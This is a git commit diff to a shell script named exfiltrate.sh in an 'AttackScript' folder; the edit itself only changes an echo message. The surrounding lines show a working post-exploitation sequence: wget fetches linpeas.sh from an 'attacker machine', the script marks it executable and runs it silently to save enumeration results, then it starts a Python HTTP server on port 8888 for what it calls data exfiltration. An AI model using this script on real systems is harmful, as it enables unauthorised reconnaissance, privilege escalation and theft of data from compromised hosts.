232982f07eb4accbd7bc073de5bf38b6e6d2be8b
Shujuan <71871190+juanjuan7699@users.noreply.github.com>
2022-10-21 01:32:07 +0800

    Update exfiltrate.sh

--- AttackScript/exfiltrate.sh
+++ AttackScript/exfiltrate.sh
@@ -2,7 +2,7 @@ echo "getting linpeas from attacker machine"
 wget http://$1/linpeas.sh;
 echo "giving linpeas execute permission"
 chmod +x linpeas.sh;
-echo "Running linpeas and saving results into a text file"
+echo "Running linpeas and saving results into a results.txt file"
 { ./linpeas.sh > results.txt; } >/dev/null 2>&1
 echo "Setting up a python server for data exfiltration"
 python3 -m http.server 8888;
